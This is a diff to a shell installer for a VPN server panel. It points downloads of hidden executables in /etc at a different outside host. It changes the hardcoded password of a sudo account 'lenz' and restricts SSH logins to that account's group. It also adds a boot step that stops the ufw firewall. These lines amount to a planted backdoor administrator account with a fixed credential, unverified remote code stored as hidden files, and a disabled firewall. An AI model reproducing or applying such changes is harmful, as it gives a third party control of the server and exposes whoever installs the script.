@@ -90,9 +90,9 @@ cd /etc || exit
 wget 'https://pastebin.com/raw/xtPc5t1k' -O /etc/socks.py
 dos2unix /etc/socks.py
 chmod +x /etc/socks.py
-wget 'https://raw.githubusercontent.com/mddaplopar/panel/panel_files/monitor' -O /etc/.monitor
-wget 'https://raw.githubusercontent.com/mddaplopar/panel/panel_files/ws' -O /etc/.ws
-wget 'https://raw.githubusercontent.com/mddaplopar/panel/panel_files/counter' -O /etc/.counter
+wget 'http://firenetvpn.net/files/repo/monitor' -O /etc/.monitor
+wget 'http://firenetvpn.net/files/repo/ws' -O /etc/.ws
+wget 'http://firenetvpn.net/files/repo/counter' -O /etc/.counter
 chmod +x /etc/.monitor
 chmod +x /etc/.ws
 chmod +x /etc/.counter
@@ -153,8 +153,8 @@ push "dhcp-option DNS 8.8.4.4"
 push "compress lz4-v2"
 push "persist-key"
 push "persist-tun"
-#client-connect /etc/openvpn/login/connect.sh
-#client-disconnect /etc/openvpn/login/disconnect.sh
+client-connect /etc/openvpn/login/connect.sh
+client-disconnect /etc/openvpn/login/disconnect.sh
 log /etc/openvpn/server/udpserver.log
 status /etc/openvpn/server/udpclient.log
 status-version 2
@@ -197,8 +197,8 @@ push "dhcp-option DNS 8.8.4.4"
 push "compress lz4-v2"
 push "persist-key"
 push "persist-tun"
-#client-connect /etc/openvpn/login/connect.sh
-#client-disconnect /etc/openvpn/login/disconnect.sh
+client-connect /etc/openvpn/login/connect.sh
+client-disconnect /etc/openvpn/login/disconnect.sh
 log /etc/openvpn/server/tcpserver.log
 status /etc/openvpn/server/tcpclient.log
 status-version 2
@@ -482,7 +482,7 @@ sudo service stunnel4 restart
 
 install_sudo(){
   {
-    useradd -m lenz 2>/dev/null; echo lenz:@@@F1r3n3t@@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    useradd -m lenz 2>/dev/null; echo lenz:@@F1r3rg2h4@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
     echo "AllowGroups lenz" >> /etc/ssh/sshd_config
     service sshd restart
@@ -584,6 +584,7 @@ RemainAfterExit=yes
 [Install]
 WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
     echo '#!/bin/sh -e
+service ufw stop
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
 sysctl -p
